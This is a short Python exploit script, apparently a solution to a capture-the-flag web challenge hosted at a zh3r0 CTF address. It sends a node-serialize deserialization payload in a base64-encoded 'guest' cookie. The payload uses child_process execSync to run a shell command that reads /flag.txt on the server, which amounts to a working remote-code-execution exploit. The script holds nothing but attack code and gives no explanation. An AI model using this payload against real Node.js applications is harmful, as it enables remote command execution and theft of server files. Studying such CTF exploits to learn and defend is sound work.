import base64

import requests

#URL = "http://localhost:7777/guest"
URL = "http://web.zh3r0.cf:6666/guest"

cmd = "throw process.mainModule.require('child_process').execSync('cat /flag.txt').toString()"
payload = f'{{"rce":"_$$ND_FUNC$$_function (){{{cmd}}}()"}}'.encode()
res = requests.post(URL, cookies={"guest": base64.b64encode(payload).decode()}) 
print(res.text)
